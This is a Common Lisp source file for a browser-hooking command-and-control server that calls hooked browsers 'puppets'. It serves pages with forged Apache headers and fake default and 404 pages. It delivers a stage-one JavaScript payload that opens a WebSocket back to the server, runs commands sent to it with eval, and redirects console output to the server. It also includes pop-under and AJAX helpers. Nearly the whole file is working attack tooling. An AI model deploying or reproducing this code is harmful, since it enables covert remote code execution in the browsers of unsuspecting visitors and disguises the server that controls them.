(in-package :vampyre.delivery-server)

;;; Virtual Host
;;; ============

;;; Subclass ACCEPTOR

;; Allows for each virtual host to define its own dispatch table.
;;  Thus, we are able to run multiple servers in a single CL instance.
(defclass virtual-host (hunchentoot:acceptor)
  ;; slots
  ((dispatch-table
    :initform '()
    :accessor dispatch-table
    :documentation "List of dispatch functions"))
  ;; options
  (:default-initargs                    ; default-initargs must be used
   :address "127.0.0.1"))               ; because ACCEPTOR uses it

(defclass websocket-channel (hunchensocket:websocket-resource)
  ((uri :initarg :uri
	 :initform (error "Choose a URI for this websocket-channel!")
	 :reader uri))
  (:default-initargs :client-class 'puppet-client))

;;; This is our main delivery server class.
(defclass delivery-server (virtual-host hunchensocket:websocket-acceptor)
  ((deliverer
    :initarg :deliverer
    :initform (error "Please name this delivery server!")
    :reader deliverer
    :documentation "Name of this delivery server.")
   (websocket-channels
    :initform (make-hash-table :test 'equal)
    :accessor websocket-channels
    :documentation "List of websocket handlers.")
  (url-table
    :initform (make-hash-table :test 'equal)
    :accessor url-table
    :documentation "User-accessible URL table that is used while rebuilding the server's dispatch table.")))



;;; Specialise ACCEPTOR-DISPATCH-REQUEST for VHOSTs
(defmethod hunchentoot:acceptor-dispatch-request ((vhost virtual-host) request)
  "Dispatches to the virtual host's internal dispatch table rather than the global."
  ;; try REQUEST on each dispatcher in turn
  (mapc (lambda (dispatcher)
    (let ((handler (funcall dispatcher request)))
      (when handler               ; Handler found. FUNCALL it and return result
        (return-from hunchentoot:acceptor-dispatch-request (funcall handler)))))
  (dispatch-table vhost))
  (call-next-method))


(defmethod port ((server virtual-host))
  "Returns the port on which the server is listening."
  (acceptor-port server))



;;; Puppet Client
;;; -------------

(defclass puppet-client (hunchensocket:websocket-client)
  ;; Name of the puppet. Used for lookups and all. 
  ((name :initarg :name
	 :initform (vampyre.utils:random-name 10)
	 :accessor name)
   ;; User Agent reported by the puppet.
   (useragent :initarg :user-agent
              :initform (error "User agent required for this puppet.")
	      :accessor useragent)))


(defmethod message ((puppet puppet-client) message)
  (hunchensocket:send-text-message puppet message))

(defmethod make-execution-command (command)
  (jsown:to-json `(:obj ("type" . "exec") ("command" . ,command))))

(defmethod send-execution ((puppet puppet-client) command)
  (let ((res (make-execution-command command)))
    (message puppet res)))

(defmethod get-puppet ((chan websocket-channel) puppet-name)
  (find-if #'(lambda (element) (string= (name element) puppet-name))
	   (hunchensocket:clients chan)))

(defmethod get-channel-puppets ((chan websocket-channel))
  (hunchensocket:clients chan))

(defmethod get-server-puppets ((server delivery-server))
  (alexandria:flatten
   (loop for key being the hash-keys of (websocket-channels server)
	   using (hash-value value)
	 collect (get-channel-puppets value))))

(defun get-all-puppets ()
  (alexandria:flatten
   (loop for server in *delivery-servers*
	 collect (get-server-puppets server))))

(defun find-puppet (puppet-name)
  (find-if #'(lambda (element) (string= (name element) puppet-name))
	   (get-all-puppets)))

(defun prompt-read (prompt)
  (format *query-io* "~a> " prompt)
  (force-output *query-io*)
  (read *query-io*))

(defun js-alert (message)
  (parenscript:ps (alert (ps:lisp message))))

(defun js-message-back (mess)
  (parenscript:ps (send-message (ps:lisp mess))))

(defun js-new-tab (url)
  (parenscript:ps
    (chain window (open (ps:lisp url) "_blank"))))

(defun js-pop-under (url)
  (parenscript:ps
    (chain document
	   (add-event-listener
	    "click"
	    (lambda () (setf new-win (chain window (open (ps:lisp url)
							 "popunder"
							 "toolbar=0,location=0,directories=0,status=0,menubar=0,scrollbars=0,resizable=0")))
	      (chain new-win (blur))
	      (chain new-win (focus))
	      (chain document (remove-event-listener "click" (chain arguments callee)))
	      NIL)))))

(defun make-ajax-request (url verb)
  (parenscript:ps
    (setf req (new (-X-M-L-Http-Request)))
    (chain req (open (ps:lisp verb) (ps:lisp url) T))
    (setf (chain req onreadystatechange)
	  (lambda ()
	    (if (and (equal (chain req ready-state) 4)
		     (equal (chain req status) 200))
	      (chain console (log (chain req response-text))))))
    (chain req (send))))


(defun with-puppet (puppet command)
  (let ((p puppet)
	(com (first command))
	(args (rest command)))
    `(,com ,p ,args)))

;; (defun interact-with-puppet (name)
;;   (let ((puppet (find-puppet name))
;; 	 (command '()))
;;     (loop do
;;       (setf command (prompt-read name))
;;       (when (not (symbolp command))
;; 	(apply (alexandria:curry (first command) puppet)
;; 	       (rest command)))
;; 	  while (not (equal command :exit)))))

(defmethod hunchensocket:text-message-received ((master websocket-channel) (puppet puppet-client) message)
  (v:log :debug :message (format nil "New message from ~a: ~a~%" (name puppet) message)))


;;; Puppet resource
;;; ---------------



(defun make-websocket-channel (uri)
  "Creates a new websocket channel."
  ;; Ensures that no server with the same name or port already exist.
  (make-instance 'websocket-channel :uri uri))


(defmethod hunchensocket:client-connected ((master websocket-channel) (new-puppet puppet-client))
  (v:log :info :join (format nil "Puppet ~a (~a) has joined the ~a master." (name new-puppet) (useragent new-puppet) (uri master))))


(defmethod hunchensocket:client-disconnected ((master websocket-channel) (puppet puppet-client))
  (v:log :info :leave (format nil "Puppet ~a (~a) has disconnected from ~a." (name puppet) (name puppet) (uri master))))

(defmethod hunchensocket:text-message-received ((master websocket-channel) (puppet puppet-client) message)
  (handler-case 
      (let* ((parsed (jsown:parse message))
	     (type (jsown:val parsed "type")))
	(alexandria:switch (type :test 'equal)
	  ("ping"
	   NIL)
	  ("message"
	   (v:log :info :message (format nil "Received a message from ~a: '~a'" (name puppet) (jsown:val parsed "message"))))
	  (:default
	   (v:log :warning :message (format nil "Received a message with unknown formatting from ~a: '~a'" (name puppet) message)))))
    (t (c)
      (v:log :error :message (format nil "UNKNOWN Message from ~a: '~a'" (name puppet) message))
      (values 0 c))))
  
(defmethod get-websocket-channel ((server delivery-server) uri)
  (gethash uri (websocket-channels server)))


;;; Delivery Server
;;; ===============

;; TODO: remove direct format usage, use logger instead.

(defvar *default-delivery-server-port* 80)
(defvar *delivery-servers* '())




(defun make-delivery-server (port name)
  "Creates a new delivery server, and adds it to the global list."
  ;; Ensures that no server with the same name or port already exist.
  (if (not (or (get-delivery-server-by-name name)
	       (get-delivery-server-by-port port)))
      (push (make-instance 'delivery-server
			   :port port
			   :deliverer name
			   :document-root "should/never/exist"
			   :error-template-directory "should/never/exist")
	    *delivery-servers*)
      (format t "Port is occupied, or name already exists!")))


(defmethod (setf url-table) (new-val (obj delivery-server))
  "Ensures that the dispatch-table is rebuilt when we modify the url table."
  (setf (slot-value obj 'url-table) new-val)
  (rebuild-dispatch-table obj))


(defmethod (setf websocket-channels) (new-val (obj delivery-server))
  "Ensures that the dispatch-table is rebuilt when we modify the url table."
  (setf (slot-value obj 'websocket-channels) new-val)
  (rebuild-websocket-dispatch-table obj))



;; URL Handling Functions

(defmethod add-url-dispatcher ((server delivery-server) url handler-func)
  "Defines a URL to be handled by the given delivery server, calling the given function to do so."
  (push (hunchentoot:create-prefix-dispatcher url handler-func)
	(dispatch-table server)))


(defmethod rebuild-dispatch-table ((server delivery-server))
  "Internal function to rebuild the dispatch table from the url-table."
  (format t "Rebuilding the dispatch table...~%")
  (maphash #'(lambda (url func)
	       (add-url-dispatcher server url func))
	   (url-table server)))



;; Websocket Handling Functions

(defmethod rebuild-websocket-dispatch-table ((server delivery-server))
  (setf hunchensocket:*websocket-dispatch-table* nil)
  (when (websocket-channels server)
    (push #'(lambda (request)
	      (gethash (hunchentoot:script-name request)
		    (websocket-channels server)))
	  hunchensocket:*websocket-dispatch-table*)))


(defmethod handle-url ((server delivery-server) url handler-func)
  "Defines a URL to call a given function."
  (format t "Handling '~a' with ~a...~%" url handler-func)
  (setf (gethash url
		 (url-table server))
	handler-func)
  (rebuild-dispatch-table server))


(defmethod handle-websocket-url ((server delivery-server) url)
  "Defines a URL to call a websocket."
  (format t "Handling websocket '~a'...~%" url)
  (setf (gethash url
		 (websocket-channels server))
	(make-websocket-channel url))
  (rebuild-websocket-dispatch-table server))

  


;; Start and Stop functions

(defmethod listen ((server delivery-server))
  "Starts the delivery server, stopping it first if it was already started."
  (when (hunchentoot:started-p server)
    (kill server))
  (format t "Starting Delivery server on port ~a...~%" (port server))
  (hunchentoot:start server))

(defmethod kill ((server delivery-server))
  "Stops the delivery server, or does nothing if it had not been started."
  (when (hunchentoot:started-p server)
    (hunchentoot:stop server :soft t)
    (format t "Stopped Delivery server.~%")))

(defmethod kill-and-clear ((server delivery-server))
  "Stops the delivery server if necessary, and clear it from the list."
  (kill server)
  (format t "Deleting deliverer ~a...~%" (deliverer server))
  (setf *delivery-servers* (delete server *delivery-servers*)))



;; Details Functions

(defmethod display-details ((server delivery-server))
  "Displays the details of each delivery server."
  (loop for pair in (get-details server)
     do (progn
	  (format t "~a: ~a~%" (car pair) (cdr pair)))))


;; TODO: make one per class that will be list-manipulated.
(defmethod get-details ((server delivery-server))
  "Gets the details of a delivery server."
  `((name . ,(deliverer server))
    (port . ,(port server))
    (active . ,(format nil "~:[no~;yes~]" (started-p server)))))



;; Display Functions

;; Make a macro for other lists?
(defun do-delivery-list (list-fun)
  (loop for e in *delivery-servers*
     do (progn (funcall list-fun e))))

(defun display-delivery-servers ()
  "Displays details about all delivery servers."
  (do-delivery-list #'(lambda (x) (display-pairs (get-details x)))))

(defun table-delivery-servers ()
  "Displays a table of the delivery servers in a nice format."
  (let ((table (ascii-table:make-table '("Name" "Port" "Active"))))
    (do-delivery-list (lambda (x) (ascii-table:add-row table (get-values (get-details x)))))
    (ascii-table:display table)))

(defmethod display-url-table ((server delivery-server))
  "Displays the URL table of the server in a nice format."
  (let ((table (ascii-table:make-table '("URL" "Handler"))))
    (maphash #'(lambda (k v)
		 (ascii-table:add-row table (list k v)))
	     (url-table server))
    (ascii-table:display table)))


;; Example Test Page

(defun gzip-compress (str-data)
  (salza2:compress-data (sb-ext:string-to-octets str-data)
			'salza2:gzip-compressor))

(defun send-test-page ()
  "Default test page to send.  Does not mimick any particular page."
  (setf (hunchentoot:content-type*) "text/html")
  
  ;; Sets the headers to Apache defaults.
  (setf (header-out "access-control-allow-origin") "*")
  (setf (header-out "Access-Control-Allow-Methods") "POST, GET")
  (setf (header-out "accept-Ranges") "bytes")
  (setf (header-out "connection") "Keep-Alive")
  (setf (header-out "content-Encoding") "gzip")
  (setf (header-out "etag") "2c39-57ed229677f4c-gzip")
  (setf (header-out "keep-Alive") "timeout=5, max=100")
  (setf (header-out "last-Modified") "Sun, 06 Jan 2019 23:06:26 GMT")
  (setf (header-out "server") "Apache/2.4.18 (Ubuntu)")
  (setf (header-out "vary") "Origin")
  (setf (header-out "accept-ranges") "bytes")
  
  ;; GZip the resulting page.
  (gzip-compress 
   (cl-who:with-html-output-to-string (*standard-output* nil)
     (:html
      (:head
       (:meta :charset "UTF-8")
       (:title "Apache2 Default Page: It works"))
      (:body
       (:h1 "It works!")
       (:script :type "text/javascript" :src "/script.js"))))))

; By default, we use a 404 page similar to Apache's.
(defmethod acceptor-status-message ((server delivery-server) http-return-code &key &allow-other-keys)
  "Builds and returns the Apache 404 error page if it is received."

  (cond ((equal http-return-code 404)
	 (progn
	   ;; Sets the headers to Apache defaults.
	   (setf (header-out "connection") "Keep-Alive")
	   (setf (header-out "keep-Alive") "timeout=5, max=100")
	   (setf (header-out "server") "Apache/2.4.18 (Ubuntu)")
	    (cl-who:with-html-output-to-string (*standard-output* nil)
	      (:html
	       (:head
		(:title "404 Not Found"))
	       (:body
		(:h1 "Not Found")
		(:p (cl-who:fmt (format nil "The requested URL ~a was not found on this server." (script-name *request*))))
		(:hr)
		(:address (cl-who:fmt (format nil "Apache/2.4.18 (Ubuntu) Server at ~a Port ~a" (acceptor-address server) (acceptor-port server)))))))))))


;;; Lookup Functions

(defun get-delivery-server-by-func (parameter-func value)
  "Obtains a single delivery server by applying a function and expecting a given result."
  (find-if (lambda (elem) (equal (funcall parameter-func elem) value))
	   *delivery-servers*))


(defun get-delivery-server-by-name (name)
  "Gets a server from the list using its name."
  (get-delivery-server-by-func 'deliverer name))


(defun get-delivery-server-by-port (port)
  "Checks whether a port is occupied by another server.  Does not check for other programs that could be using the port."
  (get-delivery-server-by-func 'port port))




(defun basic-websocket-puppet (uri)
  (parenscript:ps
    (defvar *socket* (new (-Web-Socket (ps:lisp uri))))
    (defvar *keep-alive-interval* 10000)

    ;; Defines the function to call as soon as the websocket is open.
    (defun on-open (event)
      ;; Setup the Pings.
      (chain window (set-interval send-ping *keep-alive-interval*))
      ())

    (defun send-message (m)
      (setf obj (create type "message"
			message m))
      (chain *socket* (send (chain -J-S-O-N (stringify obj)))))

    ;; Test on-message function.
    (defun on-message (event)
      ;; We will be parsing JSON... Let's try-catch this.
      (try
       (progn
	 
	 ;; Do the parsing
	 (setf json
	       (chain -J-S-O-N (parse (chain event data))))
	 ;; If the parsing succeeded, obtain the "type" attribute.
	 (setf type
	       (chain json type))
	 
	 ;; Checks that type exists
	 (if (not (= (typeof type) "undefined"))

	     ;; If type is exec, meaning that we want to execute a command.
	     (if (= type "exec")
		 (progn (chain console (log "can execute!"))

			;; Try to retrieve the "command" attribute.
			(setf command (chain json command))

			;; If it exists...
			(if (not (= (typeof command) "undefined"))
			    (progn
			      (chain console (log (+ "Executing: " command)))

			      ;; Execute!
			      (eval command))
			    ;; Command does not exist.
			    (chain console (log "No command defined!"))))
		 ;; Logs the "type" attribute, since it seems unknown.
		 (chain console (log type)))
	     ;; Logs that there is no type.
	     (chain console (log "No 'type' in this JSON object."))))
      ;; If an error was thrown, log it.
       (:catch (e) (chain console (log "invalid JSON.")))
      
      ;; Logs the event that was received, just in case.
      (chain console (log event))))

    ;; Function to send a keep-alive message.
    (defun send-ping ()
      (setf obj (create type "ping"))
      (chain *socket* (send (chain -j-s-o-n (stringify obj)))))

    ;; Binds the listener to the on-open function.
    (setf (getprop *socket* 'onopen) on-open)
    (setf (getprop *socket* 'onmessage) on-message)

    (setf (getprop console 'log) send-message)))


(defun send-stage-one (connect-back-url)
  (setf (hunchentoot:content-type*) "text/javascript")
  (setf (header-out "access-control-allow-origin") "*")
  (setf (header-out "Access-Control-Allow-Methods") "POST, GET")

  (format nil (basic-websocket-puppet connect-back-url)))
